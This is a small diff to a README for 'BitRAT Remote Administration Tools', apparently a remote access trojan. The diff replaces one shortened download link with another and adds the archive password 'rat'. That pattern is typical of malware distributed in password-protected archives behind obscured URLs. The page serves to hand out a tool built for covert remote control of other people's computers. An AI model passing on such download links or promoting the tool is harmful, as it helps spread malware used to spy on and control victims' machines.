@@ -1,7 +1,8 @@
 # BitRAT
 BitRAT Remote Administration Tools
 
-Download: https://cutt.ly/4Vmh0uU
+Download: https://cutt.ly/1VUt4hk
+Password: rat
 
 In case the BitRAT software doesn't launch properly, there are a few things you may wish to try:
 
